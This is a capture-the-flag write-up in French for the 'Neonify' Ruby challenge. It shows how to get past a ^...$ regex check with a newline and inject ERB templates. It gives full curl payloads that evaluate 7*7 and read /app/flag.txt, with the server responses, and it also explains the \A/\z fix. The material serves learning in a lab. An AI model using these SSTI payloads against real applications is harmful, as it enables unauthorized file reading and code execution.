\section{Neonify}

Keywords: SSTI ruby


si on fait un test en virant le controle sur l'input on a un SSTI si l'on
rentre \verb+<%= 7 * 7 %>+ on obtient 49.
et donc avec l'input suivant on choppe bien le flag
\verb+<%= File.open('/app/flag.txt').read %>+

le probl√®me c'est ca:
\begin{verbatim}
params[:neon] =~ /^[0-9a-z ]+$/i
\end{verbatim}

\url{https://guides.rubyonrails.org/security.html#regular-expressions}

donc a priori si l'input est sur 2 lignes cela ne va valider que la premiere.

To fix the regular expression, \verb+\A+ and \verb+\z+ should be used instead
of \verb+^+ and \verb+$+


\begin{verbatim}
    ^ Matches the beginning of a line.

    $ Matches the end of a line.

    \A Matches the beginning of the string.

    \z Matches the end of the string.

    \Z Matches the end of the string unless the string ends with a "\n", in which case it matches just before the "\n".
\end{verbatim}

donc en passant par curl on doit pouvoir le faire. Non il faut faire un URL
encode
\begin{verbatim}
$ curl -X POST http://localhost:1337 --data-raw 'neon=A
%3C%25%3D%207%20%2A%207%20%25%3E'
<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow">A
49</h1>
    </div>
</body>
</html>
\end{verbatim}


donc
\begin{verbatim}
$ curl -X POST http://localhost:1337 --data-raw 'neon=A
%3C%25%3D%20File.open%28%27%2Fapp%2Fflag.txt%27%29.read%20%25%3E'
<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow">A
HTB{f4k3_fl4g_f0r_t3st1ng}</h1>
    </div>
</body>
</html>
\end{verbatim}




